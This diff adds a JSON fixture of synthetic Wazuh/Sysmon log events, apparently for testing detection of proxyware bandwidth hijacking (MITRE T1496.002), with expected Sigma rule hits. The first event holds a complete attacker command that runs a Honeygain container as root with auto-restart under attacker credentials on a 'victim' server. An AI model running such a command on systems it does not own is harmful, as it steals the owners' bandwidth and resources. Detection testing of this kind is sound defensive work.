@@ -1,0 +1,143 @@
+{
+  "_metadata": {
+    "attack_id": "T1496.002",
+    "variation": "002",
+    "name": "Bandwidth Hijacking - Honeygain Linux Container",
+    "description": "Attacker deploys Honeygain Docker container to monetize server bandwidth",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "impact",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Linux Event 1 - Docker run for Honeygain",
+      "sequence": 1,
+      "timestamp": "2026-02-08T17:15:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T17:15:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Docker Container Started",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1496.002",
+              "T1610"
+            ],
+            "tactic": [
+              "Impact",
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Bandwidth Hijacking",
+              "Deploy Container"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.300022",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/sysmon.log",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 17:15:00.000",
+            "processGuid": "{A1B2C3D4-IMPC-1496-0004-000000000001}",
+            "processId": "8100",
+            "image": "/usr/bin/docker",
+            "commandLine": "docker run -d --name honeygain --restart=always honeygain/honeygain -tou-accept -email attacker@proton.me -pass Str0ngP@ss123 -device victim-server",
+            "currentDirectory": "/root",
+            "user": "root",
+            "parentProcessGuid": "{A1B2C3D4-IMPC-1496-0004-PARENT000001}",
+            "parentProcessId": "8000",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "-bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-impact",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1496.002",
+        "_fomorian_expected_detection": "Sigma: Proxyware Container Deployment (T1496.002)"
+      }
+    },
+    {
+      "_comment": "Sysmon Linux Event 3 - Honeygain connecting to infrastructure",
+      "sequence": 2,
+      "timestamp": "2026-02-08T17:15:15.000Z",
+      "log": {
+        "timestamp": "2026-02-08T17:15:15.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 3: Proxyware Network Connection",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1496.002"
+            ],
+            "tactic": [
+              "Impact"
+            ],
+            "technique": [
+              "Bandwidth Hijacking"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.300023",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/sysmon.log",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 17:15:15.000",
+            "processGuid": "{A1B2C3D4-IMPC-1496-0004-000000000002}",
+            "processId": "8150",
+            "image": "/app/honeygain",
+            "user": "root",
+            "protocol": "tcp",
+            "sourceIp": "198.51.100.30",
+            "sourcePort": "45678",
+            "destinationIp": "34.102.136.180",
+            "destinationPort": "443",
+            "destinationHostname": "api.honeygain.com"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-impact",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1496.002",
+        "_fomorian_expected_detection": "Sigma: Connection to Proxyware Service (T1496.002)"
+      }
+    }
+  ]
+}
